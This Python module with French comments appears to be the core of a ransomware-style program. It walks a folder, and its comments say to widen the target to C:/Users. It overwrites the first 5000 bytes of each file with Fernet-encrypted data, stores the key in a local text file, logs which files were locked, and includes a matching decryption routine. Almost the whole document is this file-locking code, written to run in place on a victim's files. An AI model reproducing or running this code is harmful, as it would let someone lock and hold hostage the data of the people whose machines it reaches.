# coding=utf-8
import os

#--------------------------------------
# Module de chiffrement /déchiffrement
#--------------------------------------

#----------------------------------------------------------------------
# Fonction de création d'une liste des fichiers d'un dossier
# chemins complets
#----------------------------------------------------------------------

def F_listeFichiers():


    listeFichiers = []
    nombreFichiers = 0

    for (dirpath, dirnames, filenames) in os.walk("C:\Users\Admin\Desktop\Test P1"):  # à remplacer par C:/Users
        listeFichiers = [os.path.join(r, file) for r, d, f in os.walk("C:\Users\Admin\Desktop\Test P1") for file in
                         f]  # à remplacer par C:/Users
        nombreFichiers = len(listeFichiers)
        nombreFichiers = str(nombreFichiers)

    if nombreFichiers == 0:
        print('Le dossier est vide')
    else:
        print('Il y a ' + nombreFichiers + ' fichiers dans le dossier')

    return (listeFichiers)

#------------------------
# Fonction de chiffrement
#------------------------
def F_chiffrement(listeFichiers, listeProteges):

    # génération d'une clé de chiffrement avec le module fernet
    from cryptography.fernet import Fernet
    key = Fernet.generate_key()
    fernet_key = Fernet(key)

    # enregistrement de la clé dans un fichier_key
    fichierKey = open("C:\Users\Admin\Desktop\AnSo\\fichierKey.txt", 'wb')  # Open the file as wb to write bytes
    fichierKey.write(key)
    fichierKey.close()

    # variables
    i = 0
    # fichier = ' '
    rang = 0
    #listeProteges = []

    # création du fichier .txt qui contient le code résultat concaténé avec le chemin du fichier
    resultat_texte = open("C:\Users\Admin\Desktop\AnSo\\listeResultatChiffrement.txt", 'at')

    # chiffrement
    while i == 0:
        try:
            fichier = listeFichiers[rang]  # pour chaque occurence dans la liste

        except IndexError:
            i = 1  # il n'y a plus de fichier dans ce dossier
            break
        else:

            # TODO Si le fichier ne fait pa partie de la liste à ne pas chiffrer

            # ouverture et lecture du fichier à chiffrer en mode binaire (byte)
            with open(fichier, 'rb') as file:
                # chiffrement des 5000 premiers caractères avec le module fernet
                data = file.read(5000)  # Read the bytes of the input file

                try:
                    encrypted = fernet_key.encrypt(data)
                    encrypted += file.read()
                except:
                    print("Invalid Key - ", fichier, "- Unsuccessfully encrypted")

                    # alimente un fichier .txt qui contient le code résultat concaténé avec le chemin du fichier
                    resultat_texte.write('KO * ' + fichier + '\n')

                else:
                    try:
                        # ecriture dans le fichier lui même de son contenu chiffré
                        with open(fichier, 'wb') as file:
                            file.write(encrypted)  # Write the encrypted bytes to the output file
                    except IOError:
                        print("File type or authorization issue -", fichier, "- Unsuccessfully encrypted")

                        # alimente un fichier .txt qui contient le code résultat concaténé avec le chemin du fichier
                        resultat_texte.write('KO * ' + fichier + '\n')

                    else:
                        print("Valid Key - ", fichier, " - Successfully encrypted")

                        # alimente un fichier .txt qui contient le code résultat concaténé avec le chemin du fichier
                        resultat_texte.write('OK - ' + fichier + '\n')

                rang += 1  # je passe au fichier suivant

    resultat_texte.close()
    return (key)

#---------------------------
# Fonction de déchiffrement
#---------------------------
def F_dechiffrement(listeFichiers, clef) :

    # Récupération de la clef de chiffrement passée en paramètre
    from cryptography.fernet import Fernet
    fernet_key = Fernet(clef)

    # variables
    i = 0
    rang = 0

    while i == 0:
        try:
            fichier = listeFichiers[rang]  # pour chaque occurence dans la liste

            # Je ne prends que ceux qui commencent par OK et j'enlève les 5 premiers caractères


        except:
            i = 1  # il n'y a plus de fichier dans ce dossier
            break
        else:
            # ouverture et lecture du fichier à déchiffrer en mode binaire (byte)
            with open(fichier, 'rb') as file:
                # dechiffrement des 6756 premiers caractères avec le module fernet
                data = file.read(6756)

                try:
                    decrypted = fernet_key.decrypt(data)
                    decrypted += file.read()
                except:
                    print("Invalid Key - " + fichier + " Unsuccessfully decrypted")
                else:
                    # ecriture dans le fichier lui même de son contenu déchiffré
                    with open(fichier, 'wb') as file:
                        file.write(decrypted)  # Write the encrypted bytes to the output file
                    print("Valid Key - " + fichier + " Successfully decrypted")

                rang += 1    # je passe au fichier suivant
